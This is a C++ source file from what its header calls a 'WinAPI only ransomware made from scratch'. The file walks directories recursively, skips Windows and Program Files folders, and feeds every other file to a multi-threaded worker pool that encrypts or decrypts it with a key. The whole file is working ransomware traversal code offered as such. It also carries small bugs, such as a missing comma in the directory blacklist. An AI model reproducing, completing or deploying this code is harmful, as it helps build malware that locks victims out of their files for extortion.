/*
   ############################################
   # Copyright 2023 Panagiotis (MalwarePad)   #
   # WinAPI only ransomware made from scratch #
   ############################################
*/

#include "HandleDirectory.h"

std::wstring blacklistDirectories[] = {
	L"C:\\Windows\\",
	L"C:\\Program Files (x86)\\",
	L"C:\\Program Files\\"
	L"C:\\ProgramData\\"
};

int blacklistDirectoriesLength = 3;

std::mutex mtx;  // Mutex for synchronizing access to the queue
std::condition_variable cv;  // Condition variable for signaling the availability of tasks
std::queue<std::wstring> fileQueue;  // Queue to hold files for processing
bool processingFinished = false;  // Signal to indicate that processing is finished

// trying to keep multi-threading simple
void threadWorker(const std::string& privateKey, BOOL encrypt) {
	while (true) {
		std::wstring filePath;

		{
			std::unique_lock<std::mutex> lock(mtx);
			cv.wait(lock, [&] { return !fileQueue.empty() || processingFinished; });

			if (fileQueue.empty() && processingFinished) {
				return;  // Exit the thread when processing is finished
			}

			filePath = fileQueue.front();
			fileQueue.pop();
		}

		handleFile(privateKey, filePath.c_str(), encrypt);
	}
}

int handleDirectory(std::string privateKey, std::wstring base, BOOL encrypt) {
	WIN32_FIND_DATA findFileData;
	HANDLE hFind = FindFirstFile((base + L"*").c_str(), &findFileData);

	for (int i = 0; i < blacklistDirectoriesLength; i++) {
		if (base.rfind(blacklistDirectories[i]) == 0) return 1;
	}

	if (hFind == INVALID_HANDLE_VALUE) return 1; // error finding first file

	const int numThreads = std::thread::hardware_concurrency();
	std::vector<std::thread> threadPool;

	// Create and start the worker threads
	for (int i = 0; i < numThreads; ++i) {
		threadPool.emplace_back(threadWorker, privateKey, encrypt);
	}

	do {
		if (!(findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			// file, not directory, attr: folder path + findFileData.cFileName
			std::wstring filename = findFileData.cFileName;
			std::wstring encryptedAttribute = L".AES";

			if (filename.compare(L"desktop.ini") != 0) {
				// handleFile(privateKey, (base + filename).c_str(), encrypt); single-threaded approach
				std::unique_lock<std::mutex> lock(mtx);
				fileQueue.push(base + filename);
				cv.notify_one();
			}
		}
		else if (wcscmp(findFileData.cFileName, L".") != 0 && wcscmp(findFileData.cFileName, L"..") != 0) {
			// directory and not "." or ".."
			std::wstring subdirectory = base + findFileData.cFileName + L"\\";
			handleDirectory(privateKey, subdirectory, encrypt);
		}
	} while (FindNextFile(hFind, &findFileData) != 0);

	FindClose(hFind);

	std::unique_lock<std::mutex> lock(mtx);
	processingFinished = true;
	cv.notify_all();

	for (auto& thread : threadPool) {
		thread.join();
	}

	return 1;
}
